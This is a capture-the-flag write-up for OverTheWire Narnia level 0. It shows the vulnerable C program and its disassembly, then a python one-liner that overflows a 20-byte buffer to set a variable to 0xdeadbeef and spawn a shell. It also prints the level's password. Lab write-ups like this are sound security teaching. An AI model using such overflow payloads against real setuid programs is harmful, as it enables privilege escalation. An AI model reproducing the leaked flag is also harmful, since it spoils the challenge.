## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BinaryExploitation #BufferOverflow
**Completion Date & Time :** 2026 - 01 - 23 / 20:14

---
## FLAG : `O8dJypubLr`

---
## Solution :

### Step 1 : Check for `/narnia.c` 

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Here are some core informations we got : 
- It needs a `stdin` input.
- It could contain 20 char length.
- Since `scanf()` reads input **without checking buffer size** by default. So we could change other memory value.
### Step 2 : Analyze the binary file

```asm
   0x080491c6 <+0> :	push   ebp
   0x080491c7 <+1> :	mov    ebp,esp
   0x080491c9 <+3> :	push   ebx
   0x080491ca <+4> :	sub    esp,0x18
   0x080491cd <+7> :	mov    DWORD PTR [ebp-0x8],0x41414141
   0x080491d4 <+14>:	push   0x804a008
   0x080491d9 <+19>:	call   0x8049060 <puts@plt>
   0x080491de <+24>:	add    esp,0x4
   0x080491e1 <+27>:	push   0x804a03b
   0x080491e6 <+32>:	call   0x8049040 <printf@plt>
   0x080491eb <+37>:	add    esp,0x4
   0x080491ee <+40>:	lea    eax,[ebp-0x1c]
   0x080491f1 <+43>:	push   eax
   0x080491f2 <+44>:	push   0x804a051
   0x080491f7 <+49>:	call   0x80490a0 <__isoc99_scanf@plt>
   0x080491fc <+54>:	add    esp,0x8
   0x080491ff <+57>:	lea    eax,[ebp-0x1c]
   0x08049202 <+60>:	push   eax
   0x08049203 <+61>:	push   0x804a056
   0x08049208 <+66>:	call   0x8049040 <printf@plt>
   0x0804920d <+71>:	add    esp,0x8
   0x08049210 <+74>:	push   DWORD PTR [ebp-0x8]
   0x08049213 <+77>:	push   0x804a05f
   0x08049218 <+82>:	call   0x8049040 <printf@plt>
   0x0804921d <+87>:	add    esp,0x8
   0x08049220 <+90>:	cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08049227 <+97>:	jne    0x804924e <main+136>
   0x08049229 <+99>:	call   0x8049050 <geteuid@plt>
   0x0804922e <+104>:	mov    ebx,eax
   0x08049230 <+106>:	call   0x8049050 <geteuid@plt>
   0x08049235 <+111>:	push   ebx
   0x08049236 <+112>:	push   eax
   0x08049237 <+113>:	call   0x8049090 <setreuid@plt>
   0x0804923c <+118>:	add    esp,0x8
   0x0804923f <+121>:	push   0x804a06c
   0x08049244 <+126>:	call   0x8049070 <system@plt>
   0x08049249 <+131>:	add    esp,0x4
   0x0804924c <+134>:	jmp    0x8049262 <main+156>
   0x0804924e <+136>:	push   0x804a074
   0x08049253 <+141>:	call   0x8049060 <puts@plt>
   0x08049258 <+146>:	add    esp,0x4
   0x0804925b <+149>:	push   0x1
   0x0804925d <+151>:	call   0x8049080 <exit@plt>
   0x08049262 <+156>:	mov    eax,0x0
   0x08049267 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804926a <+164>:	leave
   0x0804926b <+165>:	ret

```

From the code above, we could know that our inputs was saved on `$ebp-0x1c` and `val` is saved on `[$ebp-0x8]`. So it means, we need an input with 20 Offset, and we add `0xdeadbeef` hex next to offset.

### Step 3 : Payload Input

```shell
narnia0@narnia:/narnia$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
val: 0xdeadbeef
whoami
narnia1
```

 Now we could access the shell, and retrieve the password : 
 ```shell
 cat /etc/narnia_pass/narnia1
O8dJypubLr
 ```

---
### Key Takeaways : 
- We could use `pwntool` instead of shell input, but for this level, it was a bit overkill.
- Checks for available functions also important for analysis.
- Using `cat` will hold the program (because we use `pipeline` for stdin help), without `;cat` program will not spawn a shell. After python finishes, `cat` (with no file argument) starts reading from _your terminal/keyboard_ and forwarding it into the pipe. So the pipe stays open, and whatever you type flows: keyboard → cat → pipe → narnia0's shell. That's how you get an interactive shell instead of one that dies immediately.


---
## Related Concepts : 
[[GDB]], [[Python - Payload Insert]], [[Assembly]], [[Assembly - Registers]]

---
## Next Challenge :
[[Narnia (1 -> 2)]]